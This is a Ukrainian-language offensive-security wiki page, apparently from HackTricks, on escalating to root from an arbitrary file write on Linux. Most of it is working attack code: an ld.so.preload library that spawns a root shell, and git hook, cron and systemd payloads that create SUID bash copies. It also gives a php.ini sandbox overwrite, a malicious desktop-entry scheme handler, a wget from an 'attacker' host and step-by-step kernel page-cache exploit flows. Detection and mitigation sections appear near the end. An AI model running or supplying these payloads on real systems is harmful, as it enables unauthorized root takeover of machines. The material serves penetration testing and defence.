# Довільний запис файлів від імені root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` — це загальносистемний список shared objects, які dynamic linker завантажує перед іншими shared objects. Secure-execution mode застосовує додаткові обмеження до preload, тому шлях до library, такий як `/tmp/pe.so`, не є універсальною технікою для SUID-binary.\
Якщо ви можете створити або змінити цей файл, процес, який його завантажує, завантажить зазначену library перед іншими shared objects, що дає змогу виконати code у контексті цього процесу.<sup>[[12]](#references)</sup>

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** — це виконувані скрипти, які запускаються під час подій у репозиторії, зокрема під час операцій commit і merge. Якщо **привілейований скрипт або користувач** виконує ці дії, а зловмисник може **записувати дані в папку `.git`**, hook можна використати для **підвищення привілеїв**.<sup>[[13]](#references)</sup>

Наприклад, можна **створити скрипт** у git-репозиторії в **`.git/hooks`**, щоб він завжди виконувався під час створення нового commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Файли Cron і часу

Якщо ви можете **записувати файли, пов’язані з Cron, які виконує root**, зазвичай можна отримати виконання коду під час наступного запуску завдання. Цікаві цілі включають:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Власний crontab root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- Таймери `systemd` і служби, які вони запускають

Швидкі перевірки:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Типові шляхи зловживання:

- **Додати нове завдання root cron** до `/etc/crontab` або файлу в `/etc/cron.d/`
- **Замінити скрипт**, який уже виконується через `run-parts`
- **Встановити backdoor у ціль наявного таймера**, змінивши скрипт або бінарний файл, який він запускає

Мінімальний приклад payload для cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Якщо ви можете записувати лише в каталог cron, який використовується `run-parts`, натомість помістіть туди виконуваний файл:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Нотатки:

- `run-parts` зазвичай ігнорує імена файлів, що містять крапки, тому краще використовувати імена на кшталт `backup`, а не `backup.sh`.<sup>[[15]](#references)</sup>
- Деякі системи використовують таймери `systemd` замість класичного cron, але ідея зловживання та сама: **змінити те, що root виконає пізніше**.<sup>[[20]](#references)</sup>

### Файли Service та Socket

Якщо ви можете записувати **unit-файли `systemd`** або файли, на які вони посилаються, ви можете отримати виконання коду з правами root, перезавантаживши та перезапустивши unit або дочекавшись спрацювання шляху активації service/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Цікаві цілі включають:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Перевизначення drop-in у `/etc/systemd/system/<unit>.d/*.conf`
- Service-скрипти/бінарні файли, на які посилаються `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Доступні для запису шляхи `EnvironmentFile=`, які завантажує service, що працює від root

Швидкі перевірки:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Типові шляхи зловживання:

- **Перезаписати `ExecStart=`** у service unit, що належить root і який можна змінювати
- **Додати drop-in override** зі шкідливим `ExecStart=` і спочатку очистити старий
- **Встановити backdoor у script/binary**, на який уже посилається unit
- **Перехопити socket-activated service**, змінивши відповідний `.service` файл, який запускається, коли socket отримує з’єднання

Приклад шкідливого override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Типовий flow активації:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Якщо ви не можете самостійно перезапускати служби, але можете редагувати socket-activated unit, вам може бути достатньо **дочекатися підключення клієнта**, щоб ініціювати виконання backdoored service від імені root.<sup>[[17]](#references)</sup>

### Перезапис обмежувального `php.ini`, який використовує привілейований PHP sandbox

Деякі custom daemons перевіряють наданий користувачем PHP-код, запускаючи `php` з **обмеженим `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо код у sandbox все ще має **будь-яку можливість запису** (наприклад, `file_put_contents`) і ви можете отримати доступ до **точного шляху до `php.ini`**, який використовує daemon, ви можете **перезаписати цю конфігурацію**, зняти обмеження, а потім надіслати другий payload, який виконається з підвищеними привілеями.<sup>[[2]](#references)</sup>

Типовий порядок дій:

1. Перший payload перезаписує конфігурацію sandbox.
2. Другий payload виконує код після повторного ввімкнення небезпечних функцій.

Мінімальний приклад (замініть шлях на той, який використовує daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Якщо daemon працює від імені root (або перевіряє шляхи, власником яких є root), друге виконання надає root-контекст. По суті, це **підвищення привілеїв через перезапис конфігурації**, коли sandboxed runtime все ще може записувати файли.

### binfmt_misc

`binfmt_misc` надає реєстрації в `/proc/sys/fs/binfmt_misc`; кожна реєстрація пов’язує шаблон типу файлу з interpreter. Вплив на привілеї залежить від того, хто може змінювати реєстрацію та який процес згодом виконує відповідний файл, тому перевірте ці вимоги, перш ніж розглядати це як шлях до підвищення привілеїв.<sup>[[21]](#references)</sup>

### Перезапис обробників схем (як-от http: або https:)

Desktop environments використовують MIME-асоціації та desktop entries для вибору application для URI-схем; attacker, який може записувати відповідні per-user configuration і каталоги desktop entries, може перенаправити ці схеми на launcher під своїм контролем. Змінивши файл `$HOME/.config/mimeapps.list`, щоб обробники HTTP- і HTTPS-URL вказували на шкідливий файл (наприклад, `x-scheme-handler/http=evil.desktop` і `x-scheme-handler/https=evil.desktop`), клік користувача може запустити цей desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Скрипти/бінарні файли, доступні для запису користувачу та запущені root

Якщо привілейований workflow запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл усередині директорії, що належить непривілейованому користувачу), ви можете його перехопити:<sup>[[1]](#references)</sup>

- **Виявлення запуску:** відстежуйте процеси за допомогою pspy, щоб виявити, як root викликає шляхи, контрольовані користувачем.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердьте можливість запису:** переконайтеся, що цільовий файл і його директорія належать вашому користувачу або доступні йому для запису.
- **Перехопіть ціль:** створіть резервну копію оригінального binary/script і розмістіть payload, який створює SUID shell (або виконує будь-яку іншу root action), а потім відновіть permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Запустіть privileged action** (наприклад, натисніть кнопку UI, яка запускає helper). Коли root повторно виконає hijacked path, отримайте escalated shell за допомогою `./rootshell -p`.

### Модифікація privileged binaries лише в page cache

Деякі kernel bugs не модифікують файл **на диску**. Натомість вони дають змогу змінювати лише **копію readable file у page cache**. Якщо ціллю є **setuid** або інший **root-executed** binary, наступне виконання може запустити attacker-controlled bytes із пам'яті та підвищити привілеї, навіть якщо file hash на диску не змінився.<sup>[[3]](#references)[[4]](#references)</sup>

Це корисно розглядати як **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Disk stays clean**: inode та bytes на диску не змінюються
- **Memory is dirty**: процеси, які читають або виконують cached page, отримують attacker-modified content
- **Effect is temporary**: зміна зникає після reboot або cache eviction

Цей primitive займає проміжне місце між класичним **arbitrary file write** та старішими **page-cache abuse** bugs, такими як Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW покладався на race
- Dirty Pipe мав обмеження щодо write position
- Page-cache-only primitive може бути надійнішим, якщо vulnerable path надає прямий запис у cached file-backed pages

#### Generic privesc flow

1. Отримайте kernel primitive, здатний записувати у **file-backed page cache pages**
2. Використайте його проти **readable privileged binary** або іншого root-executed file
3. Запустіть виконання **до** того, як page буде evicted з cache
4. Отримайте code execution як root, поки файл на диску все ще виглядає незміненим

Типові high-value targets:

- **setuid-root** binaries
- Helpers, запущені **root services**
- Binaries, які часто виконуються з **containers, що використовують спільний host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) — хороший приклад цього класу. Vulnerable path знаходився в Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` може переміщувати references на page-cache pages із readable file до crypto TX scatterlist
- in-place `algif_aead` decrypt path повторно використовував source та destination buffers
- `authencesn` після цього записував у destination tag region
- коли ця region усе ще посилалася на spliced file-backed pages, запис потрапляв у **page cache target file**

Отже, цікава technique полягає не в самому CVE, а в pattern:

- **передати file-backed cache pages у kernel subsystem**
- змусити subsystem **сприймати їх як writable output**
- виконати невелике контрольоване перезаписування в пам'яті

Public PoC використовував повторювані **4-byte writes**, щоб patch-ити `/usr/bin/su` у пам'яті, а потім виконував його.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) демонструє інший варіант того самого **page-cache-only write-to-root** pattern, але цього разу sink — це **IPsec ESP decrypt**, а не `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Важливий technique тут — це **metadata-laundering step**:

- `splice()` розміщує **read-only file-backed page-cache page** у ESP-in-UDP packet
- оригінальна DirtyFrag mitigation позначала цей skb прапорцем `SKBFL_SHARED_FRAG`, щоб `esp_input()` виконав **copy before decrypting**
- netfilter `TEE` дублює packet через `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone зберігає **те саме physical page-cache reference**, але втрачає `SKBFL_SHARED_FRAG`
- `esp_input()` після цього вважає clone безпечним і виконує **in-place `cbc(aes)` decrypt** поверх file-backed page

Отже, lesson для reviewer ширший за сам CVE: якщо mitigation залежить від **skb/page metadata**, щоб визначити, чи потрібно спочатку виконати copy, будь-який **clone/copy path, який зберігає backing page, але видаляє metadata**, може непомітно повторно відкрити write primitive.

Типовий exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, щоб отримати **`CAP_NET_ADMIN` усередині private network namespace**
2. підняти loopback і встановити **netfilter `TEE` rule** у `mangle/OUTPUT`
3. встановити **XFRM ESP transport SAs** через `NETLINK_XFRM`
4. закодувати кожне target 4-byte word у полі SA `seq_hi` (word-selection trick DirtyFrag)
5. надіслати spliced ESP-in-UDP packet, щоб **TEE clone** дійшов до `esp_input()` і виконав decrypt **in place**
6. повторювати, доки page-cache copy `/usr/bin/su` або іншого privileged executable не міститиме attacker-controlled code

З операційного погляду impact такий самий, як у прикладі `AF_ALG`: файл на диску залишається чистим, але `execve()` використовує **mutated page-cache bytes** і надає root.<sup>[[8]](#references)[[9]](#references)</sup>

Корисні перевірки exposure для цього варіанта:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Короткострокове зменшення attack surface тут також залежить від конкретного шляху: оновлення до kernel із підтримкою `48f6a5356a33` виправляє шлях clone, тоді як блокування autoload `xt_TEE` усуває **крок flag-laundering**, а блокування `esp4` / `esp6` усуває **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Виявлення та пошук

Якщо ви підозрюєте цей клас вразливостей, не покладайтеся лише на перевірки цілісності диска. Також перевірте:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Наведені нижче значення конфігурації відрізняють інтерфейс, який можна завантажувати, від інтерфейсу, вбудованого в kernel; правила crypto build зіставляють `CONFIG_CRYPTO_USER_API_AEAD` з `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` можна завантажувати та вивантажувати як module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудовано в kernel
- setuid binaries є хорошими цілями, оскільки patch, що працює лише з page cache, може бути достатнім, щоб перетворити локальний foothold на root

#### Зменшення attack surface для шляху `algif_aead`

Якщо вразливий інтерфейс надається loadable module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Якщо це скомпільовано в kernel, деякі disclosures повідомляли про блокування init path за допомогою:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Такий тип mitigation варто пам’ятати й для інших kernel LPE: якщо exploitation залежить від певного optional interface, його вимкнення або додавання до blacklist може зламати exploit path ще до того, як стане доступним повне оновлення kernel.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo — hijacking root-скрипта в доступній для запису користувачем директорії PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ щодо Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Розкриття інформації Openwall oss-security щодо CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Виправлення Linux stable: crypto: algif_aead — повернення до роботи out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory щодо CVE-2026-31431](https://copy.fail/)
- [7] [Технічний writeup Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Репозиторій DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: аналіз і exploitation варіанта Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Виправлення Linux: net: skb: збереження `SKBFL_SHARED_FRAG` у `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Попередня mitigation у Linux: встановлення `SKBFL_SHARED_FRAG` для spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — сторінка Linux manual](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — сторінка Linux manual](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — сторінка Debian manual](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — документація Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Асоціації MIME Applications](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Специфікація Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Специфікація Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Мова Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: вразливість page cache Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — сторінка Linux manual](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
